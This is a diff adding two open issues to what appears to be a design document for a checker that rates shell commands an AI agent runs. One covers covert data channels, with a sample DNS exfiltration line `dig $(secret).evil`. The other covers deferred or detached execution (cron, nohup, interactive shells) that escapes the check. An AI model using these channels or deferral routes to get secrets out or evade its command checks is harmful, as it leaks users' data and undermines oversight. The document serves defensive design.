@@ -130,6 +130,30 @@ change after the read (TOCTOU) and reading may have cost. Possibly a level-side
 policy: strict levels refuse payload/remote commands whose target isn't pinned
 *on the command line* (`--context`, `--profile`, explicit host).
 
+### HP-13 · Channel completeness — `status: open`
+Disclosure / Secret / Network enumerate file + stdout + known-network
+sinks/sources, but real data channels also include the **clipboard**
+(`pbcopy`/`pbpaste`), **`/dev/tcp`** redirects, **DNS labels** (`dig
+$(secret).evil`), the **keychain**/credential stores, and **another process's
+memory or argv** (`lldb -p`, `ps aux`). The set is open-ended, and the covert
+network forms (`/dev/tcp`, DNS) defeat any detection that keys "network" on known
+binaries. Surfaced by pilot-3 §B/§D.
+*Lead:* enumerate a channel taxonomy (fs / stdout-to-model / network /
+clipboard / IPC / credential-store / cross-process); treat unknown channels as
+worst-case. Whether the list can ever be *closed* is the open question.
+
+### HP-14 · Deferred, triggered, and interactive execution — `status: open`
+The profile describes a *present* effect, but execution can be decoupled from the
+check: **scheduled** (`cron`, `at`), **event-triggered** (`watchexec`, `entr`),
+**detached-persistent** (`nohup`, `setsid`), or **interactive** (`ssh` with no
+command, a REPL, `vim :!`, `docker run -it`) where the payload is *future input*
+unavailable at check time. "Will run arbitrary code at 3am / on every save / after
+I log out / whenever I type it" is a temporal shape the model has no vocabulary
+for. Surfaced by pilot-3 §A.
+*Lead:* a **trigger** sub-axis of persistence (`immediate | scheduled | event |
+boot | detached`) plus an **interactive frame** whose nested payload is opaque and
+unbounded → worst-case for the granted context.
+
 ---
 
 ## Parked policy decisions
